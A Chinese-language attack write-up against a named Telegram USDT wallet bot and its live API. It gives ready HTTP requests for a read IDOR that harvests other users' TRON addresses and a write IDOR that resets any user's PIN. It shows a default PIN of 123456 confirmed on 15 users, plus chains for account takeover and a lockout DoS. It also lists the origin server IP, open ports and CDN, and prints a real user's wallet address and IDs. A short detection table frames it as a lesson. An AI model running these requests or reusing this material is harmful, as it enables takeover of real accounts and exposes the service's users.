# 福利来钱包 @fllqb — IDOR 双杀 + 弱 PIN 全站接管

> 目标：Telegram USDT 钱包 bot @fllqb（API: aliyun.xg805.com）
> 46 个接口全枚举，2 处 IDOR（读+写），弱默认 PIN 15/15 命中

## 攻击面总览

```
46 接口分 4 组：
  tgsdk/safe/*     安全层（登录/PIN/2FA/提现）← IDOR 在这里
  tgsdk/bill/*     账单
  trade/web/*      买卖U市场 ← 市场泄露在这里
  redpacket/*      红包（人脸活体）
```

## 漏洞 1：get_verify_info — 读 IDOR（tg_id 无归属校验）

```http
POST /api/gate/tgsdk/safe/get_verify_info
{"token":"<我的token>","tg_id":"8232759819"}
```

返回**他人** TRON 收款地址 + 安全提示（hit）：

```json
{
  "tron_addr": "TMTxcVxD1H37hpfpyiWEvGWUwm1VXYDm69",
  "hit": "澳门银河会员号码"
}
```

**关键**：`token` 只验身份合法性（你是登录用户），`tg_id` 参数**不校验是否归属当前 token**。

批量利用：`ad/query` 返回全部 24 条挂单（含 tg_id / user_id），循环打 `get_verify_info` 即可收割全站 TRON 地址。

## 漏洞 2：change_pwd — 写 IDOR（user_id 无归属校验）

```http
POST /api/gate/tgsdk/safe/change_pwd
{"token":"<我的token>","user_id":"3280985","old_pwd":"123456","new_pwd":"654321"}
```

**改掉任意用户的 PIN**，只需知道 user_id + 旧 PIN。

## 漏洞 3：弱默认 PIN 123456（15/15 命中）

探测方法（无害）：`change_pwd(user_id, old=123456, new=123456)` — 旧密等于新密，不改任何东西但能确认 old_pwd 是否正确。

15 个活跃用户**全部** PIN = 123456（默认值无强制修改策略）。

## 组合杀伤链

```
链 B（致命 ATO）:
  ad/query 收集 user_id
  → change_pwd(user_id, old=123456, new=我的PIN)
  → 账户归我控制（可登录、可操作非资金功能）

链 C（DoS 锁号）:
  change_pwd(user_id, old=错误×5) → 消耗对方重试次数(5→0) → 永久锁死

链 D（资金层 — 被挡）:
  接管 PIN ✓ → 提现绑 token ✗ → 改 TRON 地址需旧安全答案 ✗
  → 身份层打穿，资金层绑死 TG 会话 token
```

## IDOR 检测要点

| 检测维度 | 本案特征 |
|----------|---------|
| 认证对象 | token（TG 会话绑定）|
| IDOR 参数 | `tg_id`（读越权）、`user_id`（写越权）|
| 枚举来源 | `ad/query` 泄露全站 tg_id + user_id |
| 对照组 | `user/info`、`withdrawal` 按 token 识别 → 安全 |
| 核心原因 | safe 层接口信任客户端传入的 tg_id/user_id，不校验归属 |

## 与 fund-edge-ops 的交叉

本案完美展示了**身份层 vs 资金层分离**：
- 身份/安全层（PIN/2FA/安全提示）用 `user_id` 参数 → IDOR 可打穿
- 资金层（余额/提现/订单）用 `token`（TG 会话绑定）→ IDOR 打不动
- **教训**：接管身份 ≠ 接管资金，需分层评估

## 环境信息

- API: `aliyun.xg805.com` → 源站 47.121.184.188（宝塔 22/80/8888）
- CDN: 23.224.113.98（5566cdn）
- 前端: Flutter Web（`img1.shjyzn.com/tgbot/`）
- 登录: TMA initData → device/gen → login → token **放 body 不放 header**
